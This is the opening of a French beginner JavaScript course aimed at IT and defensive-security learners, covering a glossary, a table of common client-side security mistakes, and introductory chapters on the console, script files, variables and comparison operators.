# Cours Complet de JavaScript pour débutant IT / cyber

## De zéro aux scripts web, au DOM, aux APIs et aux bases de la sécurité web

-----

> **Prérequis :** Aucun en développement web. Si tu as déjà touché à Linux, Bash ou Python (par exemple via les autres cours de cette collection), tu iras plus vite, mais ce n'est pas obligatoire.
>
> **Machine de lab :** un **navigateur moderne** (Firefox ou Chromium/Chrome), un **éditeur de texte** (VS Code, ou même nano), et plus tard **Node.js LTS**. Rien d'autre.
>
> **Orientation :** ce cours enseigne JavaScript en s'appuyant sur des exemples d'**administration**, de **cybersécurité défensive** (SOC, analyse de logs, OSINT, CTI), et de **sécurité web côté client**. On apprend à **comprendre** le web, **lire** du JavaScript trouvé dans une page, **manipuler** des données (JSON, URLs, IOC), **automatiser** un peu avec Node.js, et **comprendre les risques** de sécurité du navigateur. Jamais à attaquer : tous les exemples sont légitimes et défensifs.

-----

## Glossaire — Les mots à connaître

Reviens ici dès qu'un mot te semble flou. On mélange volontairement les termes JavaScript et les termes cyber, car tu vas les croiser ensemble.

| Terme | Définition simple |
| --- | --- |
| **Navigateur** | Le logiciel qui affiche les pages web (Firefox, Chrome…). Il contient un **moteur JavaScript**. |
| **Moteur JS** | La partie du navigateur (ou de Node.js) qui exécute le code JavaScript. |
| **Console** | La fenêtre des outils développeur (`F12`) où tu peux taper et exécuter du JavaScript directement. |
| **DevTools** | Les "outils développeur" du navigateur (`F12`) : console, inspecteur, réseau… |
| **Node.js** | Un programme qui permet d'exécuter du JavaScript **en dehors** du navigateur, comme un script Python. |
| **Runtime** | L'environnement qui exécute le code : le navigateur **ou** Node.js. Le même langage, deux mondes. |
| **Script** | Un fichier texte (`.js`) contenant des instructions JavaScript. |
| **Variable** | Un conteneur nommé qui stocke une valeur (texte, nombre, liste…). |
| **Type** | La nature d'une valeur : texte (`string`), nombre (`number`), vrai/faux (`boolean`)… |
| **Fonction** | Un bloc de code réutilisable auquel on donne un nom. |
| **Tableau (array)** | Une collection ordonnée de valeurs : `["a", "b", "c"]`. |
| **Objet** | Une collection de paires clé-valeur : `{ip: "1.2.3.4", port: 443}`. |
| **DOM** | *Document Object Model* : la représentation en arbre d'une page HTML, que JavaScript peut manipuler. |
| **Événement** | Une action détectable : un clic, une touche, l'envoi d'un formulaire… |
| **Callback** | Une fonction qu'on donne à exécuter "plus tard", quand quelque chose se produit. |
| **Asynchrone** | Du code qui ne s'exécute pas immédiatement dans l'ordre, typiquement en attendant le réseau. |
| **Promesse (Promise)** | Un objet qui représente un résultat **futur** (réussite ou échec). |
| **JSON** | *JavaScript Object Notation* : le format texte universel d'échange de données sur le web. |
| **API** | *Application Programming Interface* : un service accessible via le réseau auquel on envoie des requêtes. |
| **Requête HTTP** | Une demande envoyée à un serveur web (GET, POST…). |
| **`fetch`** | La fonction JavaScript moderne pour faire des requêtes HTTP. |
| **LocalStorage** | Un stockage de données persistant dans le navigateur (clé-valeur). |
| **Cookie** | Une petite donnée stockée par le navigateur, souvent envoyée automatiquement au serveur. |
| **Token** | Un jeton secret prouvant une identité ou une autorisation (à protéger absolument). |
| **XSS** | *Cross-Site Scripting* : injection de code malveillant dans une page web. |
| **DOM XSS** | Un XSS causé par du JavaScript qui insère une donnée non maîtrisée dans la page. |
| **CORS** | *Cross-Origin Resource Sharing* : la règle du **navigateur** qui encadre les requêtes vers un autre domaine. |
| **CSP** | *Content Security Policy* : un en-tête de sécurité qui limite ce qu'une page a le droit d'exécuter. |
| **IOC** | *Indicator of Compromise* : une trace d'attaque (IP, domaine, hash, URL malveillante…). |
| **OSINT** | *Open Source Intelligence* : renseignement à partir de sources publiques. |
| **SOC** | *Security Operations Center* : l'équipe qui surveille et défend un système d'information. |
| **`npm`** | Le gestionnaire de paquets de Node.js (installe des bibliothèques). |

-----

## Comment penser JavaScript

Avant d'écrire la moindre ligne, comprends la logique de base. Comme tout langage, JavaScript suit le schéma :

```text
  ENTRÉE           TRAITEMENT           SORTIE
  Ce que le    →   Ce que le code    →  Ce que le code
  code reçoit      fait avec            produit / affiche / modifie
```

En contexte web et cyber, ce schéma est partout :

```text
  Du texte     →   On extrait les    →  Une liste d'IP
  de logs          IP avec une regex    dédoublonnées
```

```text
  Un clic      →   On lit un champ   →  On affiche un résultat
  utilisateur      et on le traite      dans la page (en sécurité)
```

Il n'y a que 5 briques de base, comme dans n'importe quel langage :

1. **Recevoir** des données (saisie, fichier, réponse d'API…).
2. **Stocker** dans des variables.
3. **Tester** si quelque chose est vrai ou faux (conditions).
4. **Répéter** une action (boucles).
5. **Afficher ou enregistrer** un résultat (console, page, fichier).

Mais JavaScript ajoute **une question fondatrice** que Python et Bash n'ont pas :

> ### 🧭 La question à se poser AVANT tout : « Où tourne mon code ? »
>
> JavaScript vit dans **deux mondes différents** :
>
> - **Le navigateur** : ton code peut manipuler la page (DOM), réagir aux clics, faire des requêtes web — mais il **n'a pas accès** aux fichiers de ta machine.
> - **Node.js** : ton code peut lire/écrire des fichiers, prendre des arguments — mais il **n'y a pas de page**, pas de DOM, pas de bouton.
>
> Beaucoup d'erreurs de débutant viennent d'une confusion entre ces deux mondes (« pourquoi `document` ne marche pas dans Node ? », « pourquoi je ne peux pas ouvrir un fichier dans le navigateur ? »). **Garde cette question en tête à chaque chapitre.** Le cours te le rappellera avec des encadrés « Navigateur vs Node.js ».

-----

## La grande différence avec Python et Bash

Si tu viens des cours Bash ou Python de cette collection, trois choses vont changer.

**1. JavaScript est né dans le navigateur.** Bash pilote le système, Python est généraliste, mais JavaScript a d'abord été conçu pour **rendre les pages web vivantes**. C'est sa force et son contexte naturel. Node.js est venu **après** pour l'amener hors du navigateur.

**2. JavaScript est asynchrone et événementiel.** En Python, ton script s'exécute ligne par ligne, du début à la fin. En JavaScript navigateur, ton code **attend des événements** (un clic, une réponse réseau) et y réagit. C'est un changement de mentalité qu'on introduira en douceur (Partie 5).

**3. Côté navigateur, JavaScript ne contrôle pas le système.** Un script Python peut lire `/etc/passwd`. Un JavaScript dans une page web **ne peut pas lire librement** les fichiers de ta machine : il peut seulement accéder à un fichier si l'utilisateur le **sélectionne explicitement** via un champ prévu pour cela (par exemple un `<input type="file">`). Le navigateur impose cette limite par sécurité. Elle est **volontaire** et tu vas apprendre à raisonner avec.

Pont rapide pour les profils Python : ce que tu appelais `print()` devient `console.log()`, une `liste` devient un `array`, un `dictionnaire` devient un `objet`, et `json` est intégré nativement. Tu n'es pas en terrain totalement inconnu.

-----

## 🧨 Boîte à risques JavaScript / Web

> **À lire maintenant, même sans tout comprendre.** Ce tableau est le **fil rouge sécurité** du cours. Chaque ligne est une mauvaise pratique fréquente, et chaque ligne sera traitée en profondeur dans le chapitre indiqué. Reviens-y régulièrement : à la fin du cours, tu dois comprendre **pourquoi** chacune est dangereuse.

| # | Mauvaise pratique | Pourquoi c'est risqué (en une phrase) | Vu au chapitre |
| --- | --- | --- | --- |
| 1 | `innerHTML` avec une donnée non maîtrisée | Permet d'injecter du code dans la page → **XSS / DOM XSS**. | Ch. 15, 30 |
| 2 | Utiliser `eval` | Exécute du texte comme du code → exécution arbitraire. | Ch. 13, 30 |
| 3 | Croire que la validation **côté client** suffit | Le navigateur est modifiable : seule la validation **serveur** protège. | Ch. 17 |
| 4 | Stocker un **secret/token dans LocalStorage** | Lisible par tout JS de la page → volé via XSS. | Ch. 18, 30 |
| 5 | **Exposer un token** côté navigateur | Tout ce qui est côté client est visible par l'utilisateur. | Ch. 18, 32 |
| 6 | Confondre **cookie / sessionStorage / LocalStorage** | Mauvais choix de stockage → fuite ou perte de données. | Ch. 18, 19 |
| 7 | Mal comprendre **CORS** | On croit à tort que c'est une protection serveur (c'est une règle navigateur). | Ch. 24, 31 |
| 8 | Croire qu'un **bouton masqué** protège une action | Cacher en frontend ≠ interdire ; l'action reste appelable. | Ch. 17, 32 |
| 9 | **Dépendances npm** non maîtrisées | Code tiers exécuté chez toi → risque supply chain. | Ch. 29 |
| 10 | **Copier-coller du code inconnu** | Tu exécutes quelque chose que tu ne comprends pas. | Ch. 29, 30 |
| 11 | Ne pas gérer les **erreurs réseau** (`fetch`) | L'appli casse ou se comporte mal à la moindre panne. | Ch. 22, 23 |
| 12 | Manipuler du **JSON sans validation** | Une donnée inattendue fait planter ou trompe ton code. | Ch. 12 |
| 13 | Afficher directement une **donnée utilisateur** dans le DOM | Vecteur direct de XSS si non échappée. | Ch. 15, 30 |
| 14 | Confondre `==` et `===` | Comparaisons surprenantes dues à la conversion implicite. | Ch. 4 |
| 15 | Confondre `null` et `undefined` | Tests faux, bugs silencieux. | Ch. 3 |
| 16 | Cookie sans `HttpOnly` / `Secure` / `SameSite` | Cookie vulnérable au vol ou à l'envoi non sécurisé. | Ch. 19, 31 |
| 17 | Croire que le JS navigateur protège une **logique sensible** | Tout le code client est lisible et modifiable. | Ch. 32 |

> **Réflexe à graver dès aujourd'hui :** *tout ce qui tourne dans le navigateur est sous le contrôle de l'utilisateur.* Le frontend sert à l'expérience, **jamais** à la sécurité.

-----

## Table des matières

### Partie 0 — Ouverture
*(Glossaire, Comment penser JavaScript, différence avec Python/Bash, Boîte à risques — ci-dessus.)*

### Partie 1 — Fondamentaux du langage (dans la console et un premier fichier)
1. Découverte de JavaScript et premier code
2. Console, fichier `.js` et page minimale
3. Variables et types
4. Opérateurs, comparaisons et logique
5. Conditions
6. Boucles

### Partie 2 — Structurer les données et le code
7. Fonctions
8. Chaînes de caractères et l'objet `URL`
9. Regex simples pour OSINT / SOC *(chapitre court)*
10. Tableaux et méthodes utiles (`map`, `filter`, `find`…)
11. Objets
12. JSON
13. Erreurs, exceptions et débogage

### Partie 3 — JavaScript dans le navigateur : DOM et événements
14. Le DOM : comprendre et sélectionner
15. Modifier le DOM en sécurité (`textContent` vs `innerHTML`)
16. Événements
17. Formulaires et limites de la validation côté client

### Partie 4 — Stockage navigateur et sécurité des données client
18. LocalStorage et SessionStorage
19. Cookies et les limites de JavaScript

### Partie 5 — Le web dynamique : requêtes HTTP et asynchrone
20. Comprendre l'asynchrone
21. Promesses
22. `fetch` et requêtes HTTP
23. `async` / `await`
24. CORS : comprendre le blocage

### Partie 6 — Node.js : automatiser et scripter hors navigateur
25. Découverte de Node.js
26. Lire et écrire des fichiers
27. Arguments et petits outils CLI
28. Modules
29. `npm`, `package.json` et dépendances

### Partie 7 — Sécurité web côté client : synthèse défensive
30. XSS et DOM XSS expliqués
31. CSP, en-têtes et défenses navigateur
32. Le réflexe fondamental : le client n'est jamais de confiance
33. Lire un script JavaScript inconnu

### Synthèse finale & cheat-sheets

### Annexes
- A — `var`, hoisting, `this`, prototypes
- B — TypeScript
- C — Frameworks front (React, Vue, Angular, Next.js)
- D — Outillage moderne (Vite, bundlers)
- E — Express / backend
- F — Pont vers la suite cyber (Web Security, bug bounty débutant, OSINT tooling)

-----

# Chapitre 1 — Découverte de JavaScript et premier code

## Le minimum à savoir

### À quoi sert JavaScript ?

Une page web repose sur trois langages, et il est essentiel de ne pas les confondre :

| Langage | Rôle | Analogie |
| --- | --- | --- |
| **HTML** | La **structure** : titres, paragraphes, boutons, champs. | Le squelette |
| **CSS** | Le **style** : couleurs, tailles, positions. | L'habillage |
| **JavaScript** | Le **comportement** : réactions aux clics, calculs, requêtes réseau, modifications dynamiques. | Les muscles et le cerveau |

> ### ⚠️ À ne pas confondre : HTML vs CSS vs JavaScript
> HTML décrit *ce qui est là*. CSS décrit *à quoi ça ressemble*. JavaScript décrit *ce qui se passe quand*. Sans JavaScript, une page est figée : elle s'affiche mais ne **réagit** à rien.

JavaScript est aujourd'hui l'un des langages les plus répandus au monde, précisément parce qu'il tourne dans **tous** les navigateurs. Pour un profil IT/cyber, le savoir-lire est un atout direct : en OSINT comme en analyse, tu rencontreras du JavaScript dans presque toutes les pages que tu inspectes.

### Navigateur vs Node.js : la distinction fondatrice

Le **même** langage JavaScript s'exécute dans deux environnements :

- **Dans le navigateur** : pour rendre les pages vivantes. C'est ici qu'on commence, car **tu n'as rien à installer**.
- **Dans Node.js** : pour écrire des scripts comme en Python. On y viendra en Partie 6.

On commence par le navigateur parce que le retour est **immédiat** : tu tapes du code, tu vois le résultat à la seconde.

### Ouvrir la console (ton premier outil)

Tout navigateur moderne contient une **console JavaScript** intégrée. C'est ton bac à sable.

1. Ouvre ton navigateur sur une page quelconque (même une page blanche `about:blank`).
2. Appuie sur **`F12`** (ou clic droit → *Inspecter*).
3. Clique sur l'onglet **Console**.

Tu vois une invite où tu peux taper du JavaScript. Écris ceci et appuie sur Entrée :

```javascript
console.log("Bonjour depuis JavaScript");
```

Résultat affiché dans la console :

```text
Bonjour depuis JavaScript
```

Félicitations, tu viens d'exécuter du JavaScript. `console.log()` est l'équivalent du `print()` de Python : il **affiche** quelque chose dans la console.

### Commentaires

Comme dans tout langage, on annote son code. JavaScript ignore les commentaires à l'exécution.

```javascript
// Ceci est un commentaire sur une seule ligne

/*
   Ceci est un commentaire
   sur plusieurs lignes
*/

console.log("Le code, lui, s'exécute"); // commentaire en fin de ligne
```

## Très utile en pratique

Tu peux faire des calculs directement dans la console — pratique pour une vérification rapide :

```javascript
console.log(443 + 80);      // 523
console.log(1024 * 8);      // 8192
console.log("a".repeat(10)); // aaaaaaaaaa
```

Tu peux aussi enchaîner plusieurs valeurs dans un seul `console.log`, séparées par des virgules :

```javascript
console.log("Statut :", 200, "OK");
// Statut : 200 OK
```

> ### 💡 À éviter dès le début : `alert()`
> Tu verras souvent `alert("message")` dans de vieux tutoriels. Ça ouvre une boîte de dialogue bloquante. On l'évite : `console.log()` est plus propre, ne bloque pas, et reflète mieux les pratiques réelles.

## Exemple simple

Inspecter une donnée et la transformer, entièrement dans la console :

```javascript
// Une URL trouvée dans une page
let url = "https://Example.COM/login?user=admin";

// On l'affiche
console.log("URL brute :", url);

// On la normalise en minuscules
console.log("Normalisée :", url.toLowerCase());
```

Sortie console :

```text
URL brute : https://Example.COM/login?user=admin
Normalisée : https://example.com/login?user=admin
```

## Application IT / cyber / OSINT

La console du navigateur est **le premier réflexe d'inspection** d'une page web. En OSINT et en analyse défensive, elle te permet de :

- lire les **variables JavaScript** qu'une page expose (parfois des données sensibles oubliées là) ;
- tester rapidement une transformation de texte sur un IOC ;
- comprendre **comment** une page se comporte avant de l'analyser plus en profondeur.

Concrètement, dès qu'une page web t'intrigue, ouvrir `F12` → Console est souvent ta première action. Ce cours t'apprend à comprendre ce que tu y vois.

## ❌ Erreur classique

```javascript
// ❌ Oublier les guillemets autour d'un texte
console.log(Bonjour);
// → ReferenceError: Bonjour is not defined
// JavaScript croit que "Bonjour" est le nom d'une variable !

// ✅ CORRECT : un texte va entre guillemets
console.log("Bonjour");

// ❌ Confondre la console du navigateur et un terminal
ls
// → la console n'est PAS un shell : "ls" n'existe pas en JavaScript
```

> **Réflexe diagnostic :** un message `ReferenceError: X is not defined` signifie presque toujours que tu as écrit un mot **sans guillemets** alors que c'était du texte, ou que tu utilises une variable qui n'existe pas encore.

## Exercices

**Guidé**
1. Ouvre la console (`F12`).
2. Affiche ton prénom avec `console.log`.
3. Affiche le résultat de `65535 - 1024`.
4. Affiche, en une seule instruction : le texte `"Port :"` suivi du nombre `443`.

**Autonome**
Dans la console, écris du code qui affiche la version en minuscules du texte `"ADMIN@Example.COM"`. *(Indice : `.toLowerCase()`.)*

**Défi**
Trouve, dans la console, comment afficher le **nombre de caractères** du texte `"https://example.com"`. *(Indice : les chaînes ont une propriété `.length`. On l'écrit sans parenthèses : `texte.length`.)*

## ✅ Tu sais maintenant…

- expliquer la différence entre HTML, CSS et JavaScript ;
- distinguer JavaScript **navigateur** et JavaScript **Node.js** ;
- ouvrir la console DevTools avec `F12` ;
- afficher des valeurs avec `console.log()` ;
- écrire des commentaires ;
- reconnaître une `ReferenceError` due à des guillemets manquants.

-----

# Chapitre 2 — Console, fichier `.js` et page minimale

## Le minimum à savoir

La console est parfaite pour **tester**, mais on n'écrit pas un vrai programme dedans : dès qu'on recharge la page, tout disparaît. Pour conserver et réutiliser ton code, tu l'écris dans un **fichier**. Il y a deux façons d'exécuter un fichier `.js`, une pour chaque monde :

1. **Dans le navigateur**, en le reliant à une page HTML (ce chapitre).
2. **Avec Node.js**, en ligne de commande (Partie 6).

On apprend la première maintenant, pour ne pas rester coincé dans la console.

### Une page minimale en deux fichiers

Crée un dossier de travail, puis deux fichiers côte à côte.

**Fichier `index.html` :**

```html
<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8">
    <title>Mon lab JavaScript</title>
  </head>
  <body>
    <h1>Page de test JavaScript</h1>

    <!-- On relie notre fichier JavaScript À LA FIN du body -->
    <script src="script.js"></script>
  </body>
</html>
```

**Fichier `script.js` (dans le même dossier) :**

```javascript
// Ce code s'exécute quand la page se charge
console.log("Le fichier script.js est bien chargé");
```

### Lancer la page

Double-clique sur `index.html` (ou ouvre-le depuis le navigateur). La page s'affiche avec son titre. Pour voir le message du script, ouvre la **console** (`F12`) : tu y verras `Le fichier script.js est bien chargé`.

> ### 🧭 Ce qui vient de se passer
> Le navigateur a lu `index.html`, a rencontré la balise `<script src="script.js">`, est allé chercher le fichier `script.js`, et l'a exécuté. **C'est le pont entre une page et ton code.**

### Pourquoi `<script>` à la fin du `<body>` ?

Le navigateur lit la page **de haut en bas**. Si ton script s'exécute **avant** que les éléments de la page existent, il ne les trouvera pas (tu auras des erreurs en Partie 3, sur le DOM). En plaçant `<script>` juste avant `</body>`, tu garantis que toute la page est déjà là quand ton code démarre.

## Très utile en pratique

Tu peux écrire plusieurs instructions dans `script.js`, elles s'exécutent dans l'ordre :

```javascript
console.log("Étape 1 : démarrage");
console.log("Étape 2 : analyse");
console.log("Étape 3 : terminé");
```

Modifie le fichier, **sauvegarde**, puis **recharge la page** (`F5`) : la console reflète tes changements. Ce cycle *écrire → sauvegarder → recharger → lire la console* est ta boucle de travail de base côté navigateur.

> ### 🧭 Navigateur vs Node.js
> Ici, on exécute le `.js` **via une page HTML dans le navigateur**. En Partie 6, on exécutera un `.js` **sans aucune page**, directement avec la commande `node script.js`. Même fichier `.js`, deux façons de l'exécuter — la fameuse question « où tourne mon code ? ».

## Exemple simple

`script.js` qui calcule et affiche, sans rien dans la page :

```javascript
let portHttp = 80;
let portHttps = 443;

console.log("Ports web standard :", portHttp, "et", portHttps);
```

Sortie dans la console après rechargement :

```text
Ports web standard : 80 et 443
```

## Application IT / cyber / OSINT

Savoir créer une page minimale `index.html` + `script.js` est indispensable pour :

- **tester** localement un comportement JavaScript que tu as observé ailleurs ;
- construire plus tard tes **petits outils web** (un inspecteur d'IOC, un lookup OSINT — ce sont les mini-projets à venir) ;
- comprendre la structure de base d'**absolument toutes** les pages web que tu analyseras : elles relient leur logique via des balises `<script>`.

Quand tu inspectes une page en OSINT, repérer **où** sont les balises `<script>` et **quels** fichiers `.js` elles chargent est l'une des premières choses à faire.

## ❌ Erreur classique

```html
<!-- ❌ script.js dans le <head>, avant que la page existe -->
<head>
  <script src="script.js"></script>  <!-- risque d'erreurs sur le DOM -->
</head>

<!-- ✅ script.js à la fin du <body> -->
<body>
  ...
  <script src="script.js"></script>
</body>
```

Autres pièges fréquents :

- **Mauvais chemin** : `<script src="script.js">` cherche le fichier **dans le même dossier**. S'il est ailleurs, rien ne se charge (regarde l'onglet *Réseau* ou *Console* des DevTools : tu verras un 404).
- **Oublier de sauvegarder** le fichier avant de recharger : tu vois encore l'ancien code.
- **Confondre** le contenu du fichier `.html` et du fichier `.js` : le JavaScript va dans `script.js`, pas entre les balises HTML.

> **Réflexe diagnostic :** ton script "ne fait rien" ? Ouvre la console. Si tu vois une erreur **404** sur `script.js`, c'est un problème de **chemin/nom de fichier**, pas de code.

## Exercices

**Guidé**
1. Crée un dossier `lab-js`.
2. Crée `index.html` et `script.js` comme ci-dessus.
3. Dans `script.js`, affiche trois lignes : `"Connexion"`, `"Authentification"`, `"Session ouverte"`.
4. Ouvre la page, ouvre la console (`F12`), vérifie les trois lignes.

**Autonome**
Modifie `script.js` pour afficher le résultat de `255 * 255` (le nombre d'adresses dans un /16 simplifié, à titre d'exemple de calcul). Sauvegarde, recharge, vérifie.

**Défi**
Déplace volontairement la balise `<script>` dans le `<head>`, recharge, et observe (on verra l'impact réel en Partie 3). Puis remets-la à la fin du `<body>`. Renomme ensuite `script.js` en `app.js` **sans** changer le `src` du HTML : observe l'erreur 404 dans la console, puis corrige le `src`.

## ✅ Tu sais maintenant…

- créer une page minimale `index.html` + `script.js` ;
- relier un fichier JavaScript à une page avec `<script src="...">` ;
- expliquer pourquoi on place `<script>` à la fin du `<body>` ;
- utiliser la boucle *écrire → sauvegarder → recharger → console* ;
- diagnostiquer un script qui ne se charge pas (erreur 404, mauvais chemin).

-----

# Chapitre 3 — Variables et types

## Le minimum à savoir

Une **variable** est un conteneur nommé qui stocke une valeur. En JavaScript moderne, on en déclare avec **`let`** ou **`const`**.

```javascript
let utilisateur = "admin";   // peut changer plus tard
const port = 443;            // ne changera jamais
```

- **`let`** : une variable dont la valeur **peut** changer.
- **`const`** : une variable dont la valeur **ne doit pas** changer (constante).

```javascript
let statut = "actif";
statut = "inactif";   // ✅ autorisé avec let

const PORT = 443;
PORT = 8443;          // ❌ TypeError: Assignment to constant variable.
```

> ### ⚠️ Évite `var` au début
> Tu croiseras `var` dans du vieux code. Il a un comportement de portée déroutant (voir Annexe A). **Règle simple pour débuter :** utilise `const` par défaut, et `let` seulement si la valeur doit changer. N'utilise pas `var`.

### Les types de valeurs

Une valeur a une **nature** : son **type**. Les types de base à connaître :

| Type | Exemple | Description |
| --- | --- | --- |
| **string** | `"1.2.3.4"` | Du texte, entre guillemets. |
| **number** | `443`, `3.14` | Un nombre (entier ou décimal, pas de distinction). |
| **boolean** | `true`, `false` | Vrai ou faux. |
| **null** | `null` | Une absence de valeur **volontaire**. |
| **undefined** | `undefined` | Une valeur **non encore définie**. |
| **object** | `{ip: "1.2.3.4"}` | Une structure clé-valeur (chapitre 11). |
| **array** | `["a", "b"]` | Une liste ordonnée (chapitre 10). Techniquement un type d'objet. |

Pour connaître le type d'une valeur, utilise `typeof` :

```javascript
console.log(typeof "1.2.3.4");  // "string"
console.log(typeof 443);        // "number"
console.log(typeof true);       // "boolean"
console.log(typeof undefined);  // "undefined"
console.log(typeof null);       // "object"  ← bizarrerie historique, à connaître
```

### Les guillemets et les template strings

Le texte (string) peut s'écrire avec des guillemets doubles `"..."`, simples `'...'`, ou des **backticks** `` `...` ``. Les backticks sont les plus utiles : ils permettent d'**insérer des variables** directement avec `${...}`.

```javascript
const ip = "10.0.0.5";
const port = 22;

// ❌ Concaténation pénible avec +
console.log("Connexion à " + ip + " sur le port " + port);

// ✅ Template string : bien plus lisible
console.log(`Connexion à ${ip} sur le port ${port}`);
```

Les deux affichent : `Connexion à 10.0.0.5 sur le port 22`.

## Très utile en pratique

Stocker des données d'analyse dans des variables bien typées rend le code clair :

```javascript
const ip = "192.168.1.50";       // string
const port = 3389;               // number
const estChiffre = false;        // boolean
const protocole = "RDP";         // string

console.log(`Service détecté : ${protocole} sur ${ip}:${port} (chiffré : ${estChiffre})`);
// Service détecté : RDP sur 192.168.1.50:3389 (chiffré : false)
```

## Exemple simple

```javascript
let nbTentatives = 0;       // un compteur, amené à changer → let
const seuilAlerte = 5;      // un seuil fixe → const

nbTentatives = nbTentatives + 1;   // une tentative
nbTentatives = nbTentatives + 1;   // une autre

console.log(`Tentatives : ${nbTentatives} / seuil : ${seuilAlerte}`);
// Tentatives : 2 / seuil : 5
```

## Application IT / cyber / OSINT

En analyse défensive, tu modélises constamment des observations sous forme de variables typées : une **IP** est une string, un **port** un number, un **flag** « malveillant » un boolean. Bien typer dès le départ évite des comparaisons absurdes (par exemple comparer un port écrit en texte `"443"` avec un nombre `443` — un piège qu'on dissèque au chapitre 4).

Le réflexe `typeof` est aussi un outil de **diagnostic** : quand une donnée venue d'une API ne se comporte pas comme prévu, vérifier `typeof maValeur` révèle souvent qu'un nombre est en fait une string.

## ❌ Erreur classique

```javascript
// ❌ Réassigner une const
const x = 10;
x = 20;
// → TypeError: Assignment to constant variable.

// ❌ Utiliser une variable avant de la déclarer
console.log(y);   // ReferenceError (avec let/const)
let y = 5;

// ❌ Confondre null et undefined
let a;            // déclarée mais sans valeur → undefined
let b = null;     // valeur "vide" volontaire → null
console.log(a);   // undefined
console.log(b);   // null
```

> ### ⚠️ À ne pas confondre : `null` vs `undefined`
> - **`undefined`** : « cette variable existe mais on ne lui a **jamais** donné de valeur ». C'est l'état par défaut.
> - **`null`** : « on a **volontairement** mis une valeur vide ici ». C'est un choix du développeur.
>
> Confondre les deux mène à des tests faux. C'est le risque n° 15 de la Boîte à risques. On verra comment les tester proprement au chapitre suivant.

## Exercices

**Guidé**
1. Déclare une `const ip` valant `"172.16.0.1"`.
2. Déclare un `let compteur` valant `0`.
3. Incrémente `compteur` deux fois.
4. Affiche, avec une template string : `IP 172.16.0.1 vue 2 fois`.

**Autonome**
Crée trois variables décrivant un service réseau (nom du service en string, port en number, ouvert en boolean) et affiche une phrase récapitulative avec une template string. Affiche aussi le `typeof` de chacune.

**Défi**
Sans exécuter le code, **prédis** ce qu'affiche `typeof null`, `typeof []`, et `typeof "443"`. Puis vérifie dans la console. Note ce qui te surprend — on expliquera ces subtilités au fil du cours.

## ✅ Tu sais maintenant…

- déclarer des variables avec `const` et `let`, et éviter `var` ;
- choisir `const` par défaut et `let` si la valeur change ;
- nommer les types de base : string, number, boolean, null, undefined, object, array ;
- utiliser `typeof` pour inspecter un type ;
- écrire des template strings avec `` `${...}` `` ;
- distinguer `null` (vide volontaire) et `undefined` (jamais défini).

-----

# Chapitre 4 — Opérateurs, comparaisons et logique

## Le minimum à savoir

### Opérateurs arithmétiques

```javascript
console.log(10 + 3);   // 13
console.log(10 - 3);   // 7
console.log(10 * 3);   // 30
console.log(10 / 3);   // 3.333...
console.log(10 % 3);   // 1   (modulo : le reste de la division)
```

Le **modulo** `%` est utile en cyber : tester la parité, faire des regroupements, vérifier des multiples.

### Comparaisons : le point critique `==` vs `===`

JavaScript a **deux** opérateurs d'égalité, et c'est l'une des sources de bugs les plus fréquentes.

- **`===`** (égalité **stricte**) : compare la valeur **ET** le type. **C'est celui qu'on utilise.**
- **`==`** (égalité **lâche**) : compare les valeurs en **convertissant** les types au passage. Source de surprises.

```javascript
console.log(443 === 443);     // true
console.log(443 === "443");   // false  ← number vs string : types différents
console.log(443 == "443");    // true   ← == convertit "443" en nombre : piège !

console.log(0 == false);      // true   ← conversion surprenante
console.log("" == false);     // true   ← idem
console.log(null == undefined); // true ← idem
```

> ### ⚠️ À ne pas confondre : `==` vs `===`
> **Règle absolue pour débuter : utilise toujours `===` et `!==`.** Ils sont prévisibles. `==` fait des conversions implicites qui mènent à des comparaisons fausses sans erreur visible. C'est le risque n° 14 de la Boîte à risques.
>
> Mêmes opérateurs pour l'inégalité : `!==` (strict, à utiliser) vs `!=` (lâche, à éviter).

Autres comparaisons (sans piège, elles) :

```javascript
console.log(500 > 400);    // true
console.log(200 < 400);    // true
console.log(443 >= 443);   // true
console.log(80 <= 79);     // false
```

### Truthy et falsy

Dans un contexte booléen (un `if`, par exemple), chaque valeur est considérée comme **vraie** (truthy) ou **fausse** (falsy). Les valeurs **falsy** à connaître par cœur :

```text
false       0       ""  (chaîne vide)
null        undefined       NaN  (Not a Number)
```

**Tout le reste est truthy**, y compris `"0"` (chaîne contenant zéro), `"false"` (le texte), `[]` (tableau vide) et `{}` (objet vide).

> **`NaN`** signifie *Not a Number* : c'est le résultat d'un calcul numérique impossible ou invalide, par exemple `Number("abc")` ou `0 / 0`. C'est une valeur de type `number` qui représente paradoxalement « pas un nombre valide ».

```javascript
console.log(Boolean(0));        // false
console.log(Boolean(""));       // false
console.log(Boolean("0"));      // true  ← une chaîne non vide est truthy !
console.log(Boolean([]));       // true  ← surprenant mais vrai
```

### Opérateurs logiques

```javascript
//  &&  (ET) : vrai si LES DEUX sont vrais
console.log(true && true);    // true
console.log(true && false);   // false

//  ||  (OU) : vrai si AU MOINS UN est vrai
console.log(false || true);   // true

//  !   (NON) : inverse
console.log(!true);           // false
```

## Très utile en pratique

Combiner comparaisons et logique pour décrire une règle :

```javascript
const codeHttp = 503;

// Est-ce une erreur serveur ? (codes 500 à 599)
const estErreurServeur = codeHttp >= 500 && codeHttp <= 599;
console.log(`Erreur serveur : ${estErreurServeur}`);   // Erreur serveur : true
```

## Exemple simple

```javascript
const port = 22;
const estPortConnu = port === 22 || port === 80 || port === 443;
console.log(`Port bien connu : ${estPortConnu}`);   // true
```

## Application IT / cyber / OSINT

Le triage défensif repose entièrement sur des comparaisons et de la logique : « ce code HTTP est-il une erreur ? », « ce port est-il dans ma liste à surveiller ? », « cette tentative dépasse-t-elle le seuil **ET** vient-elle d'une IP externe ? ».

Le piège `==` vs `===` est particulièrement vicieux ici. Une donnée venue d'une API ou d'un log arrive souvent en **string**. Comparer `"443" == 443` renvoie `true` par conversion, ce qui peut masquer un vrai problème de typage. En utilisant **toujours `===`**, tu forces une comparaison honnête et tu repères les incohérences de type au lieu de les ignorer.

## ❌ Erreur classique

```javascript
// ❌ Utiliser == et se faire piéger par la conversion
if ("0" == false) {
  console.log("Ceci s'affiche... mais on ne s'y attendait pas !");
}

// ✅ Avec ===, le piège disparaît
console.log("0" === false);   // false (logique : string vs boolean)

// ❌ Croire qu'un tableau vide est falsy
if ([]) {
  console.log("Un tableau vide est TRUTHY"); // s'affiche !
}
```

> **Réflexe diagnostic :** une condition se comporte « bizarrement » (s'exécute alors qu'elle ne devrait pas) ? Soupçonne en premier un `==` au lieu de `===`, ou une valeur truthy/falsy inattendue. Affiche la valeur avec `console.log` et son `typeof`.

## Exercices

**Guidé**
1. Crée `const code = 404`.
